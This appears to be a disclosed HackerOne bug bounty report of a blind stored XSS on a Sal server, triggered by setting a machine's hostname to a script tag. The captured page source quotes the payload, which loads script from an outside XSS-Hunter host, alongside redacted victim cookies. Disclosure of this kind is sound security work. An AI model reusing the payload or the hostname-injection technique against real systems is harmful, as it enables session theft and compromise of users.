# Blind Stored XSS in HackerOne's Sal 4.1.4.2149 (sal.████.com)

## Report Details
- **Report ID**: 995995
- **URL**: https://hackerone.com/reports/995995
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-10-01T16:26:10.578Z
- **Disclosed**: 2020-11-09T18:33:11.954Z

## Reporter
- **Username**: nahamsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
The page located at `https://sal.██████.com/list/Activity/hour/all/0/` suffers from a Cross-site Scripting (XSS) vulnerability when a user has set their hostname on their machine to an XSS payload. 

##### Vulnerable Page
`https://sal.██████.com/list/Activity/hour/all/0/`

##### Victim IP Address
`███████`

##### Referer
`https://sal.██████.com/`

##### User Agent
`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36`

##### Cookies (Non-HTTPOnly)
`_ga=████████; _mkto_trk=id:███&token:_mch-█████.com-██████; _biz_uid=████████; _biz_nA=2; _biz_flagsA=%7B%22Version%22%3A1%2C%22Mkto%22%3A%221%22%7D; _biz_pendingA=%5B%5D; csrftoken=█████`

#### Source

```
><td><a href="/machine_detail/28/">███</a></td><td>██████████</td><td class="sorting_1">2020-10-01 06:51 BST</td></tr><tr role="row" class="odd"><td><a href="/machine_detail/17/">███████</a></td><td>██████</td><td class="sorting_1">2020-10-01 06:50 BST</td></tr><tr role="row" class="even"><td><a href="/machine_detail/41/">"&gt;<script src="https://nahamsec.xss.ht"></script></a></td><td>bensdp</td><td class="sorting_1">2020-10-01 06:49 BST</td></tr></tbody></table></div></div><div class="row"><div class="col-sm-5"><div class="dataTables_info" id="test_info" role="status" aria-live="polite">██████</div></div><div class="col-sm-7">
```


Thanks,
Ben

## Impact

#

## Attachments
No attachments
